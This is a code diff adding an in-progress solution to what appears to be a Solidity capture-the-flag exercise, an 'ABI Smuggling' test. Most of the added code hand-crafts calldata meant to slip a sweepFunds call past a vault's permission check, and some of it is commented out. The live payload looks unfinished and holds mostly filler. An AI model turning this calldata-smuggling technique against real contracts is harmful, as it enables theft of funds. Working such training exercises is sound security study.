@@ -74,6 +74,58 @@ contract ABISmugglingChallenge is Test {
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
         
+        console.logBytes4(vault.sweepFunds.selector); // 0x85fb709d
+        
+
+        // // Construct the target contract address, which is the vault address, padded to 32 bytes
+        // bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+
+        // // Construct the calldata start location offset
+        // bytes memory dataOffset = abi.encodePacked(uint256(0x80)); // Offset for the start of the action data
+
+        // // Construct the empty data filler (32 bytes of zeros)
+        // bytes memory emptyData = abi.encodePacked(uint256(0));
+
+        // // Manually define the `withdraw()` function selector as `d9caed12` followed by zeros
+        // bytes memory withdrawSelectorPadded = abi.encodePacked(
+        //     bytes4(0xd9caed12),     // Withdraw function selector
+        //     bytes28(0)              // 28 zero bytes to fill the 32-byte slot
+        // );
+
+        // // Construct the calldata for the `sweepFunds()` function
+        // bytes memory sweepFundsCalldata = abi.encodeWithSelector(
+        //     vault.sweepFunds.selector,
+        //     recovery,
+        //     token
+        // );
+
+        // // Manually set actionDataLength to 0x44 (68 bytes)
+        // uint256 actionDataLengthValue = sweepFundsCalldata.length;
+        // emit LogActionDataLength(actionDataLengthValue);
+        // bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));
+
+
+        // // Combine all parts to create the complete calldata payload
+
+
+        bytes4 padding1 = vault.sweepFunds.selector;
+        bytes memory dataOffset = abi.encodePacked(uint256(0x80)); // Offset for the start of the action data
+
+        // ?? 组合calldata
+        bytes memory actionData = abi.encode(
+            bytes4(0),                     // 4 bytes
+            bytes32(type(uint256).max),                    // 32 bytes
+            bytes32(type(uint256).max),                    // 32 bytes
+            bytes32(type(uint256).max),                    // 32 bytes
+            bytes32(type(uint256).max),
+            bytes32(type(uint256).max),                // 32 bytes (starts at the 100th byte)
+            bytes32(type(uint256).max)
+            // actionDataLength,             // Length of actionData
+            // sweepFundsCalldata            // The actual calldata to `sweepFunds()`
+        );
+        console.logBytes(actionData);
+
+        vault.execute(address(vault), actionData);
     }
 
     /**
